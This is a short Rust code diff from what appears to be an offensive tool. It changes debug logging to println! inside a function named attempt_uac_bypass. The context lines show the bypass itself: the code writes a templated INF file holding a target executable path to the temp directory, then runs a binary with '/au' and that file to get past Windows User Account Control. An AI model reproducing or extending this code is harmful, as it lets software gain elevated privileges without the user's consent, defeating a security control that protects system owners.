@@ -51,8 +51,8 @@ pub fn attempt_uac_bypass() -> bool {
     let random_file_name = format!("{}\\{}.inf", temp_dir, uuid::Uuid::new_v4());
     let inf_data = INF_TEMPLATE.replace("REPLACE_COMMAND_LINE", &format!("\"{}\"", exe_path));
 
-    log_debug!("[UAC] Creating INF file: {}", random_file_name);
-    log_debug!("[UAC] Target exe: {}", exe_path);
+    println!("[UAC] Creating INF file: {}", random_file_name);
+    println!("[UAC] Target exe: {}", exe_path);
 
     if File::create(&random_file_name)
         .and_then(|mut file| file.write_all(inf_data.as_bytes()))
@@ -65,7 +65,7 @@ pub fn attempt_uac_bypass() -> bool {
         return false;
     }
 
-    log_debug!("[UAC] Running: {} /au {}", binary_path, random_file_name);
+    println!("[UAC] Running: {} /au {}", binary_path, random_file_name);
 
     let mut child = match Command::new(binary_path)
         .arg("/au")
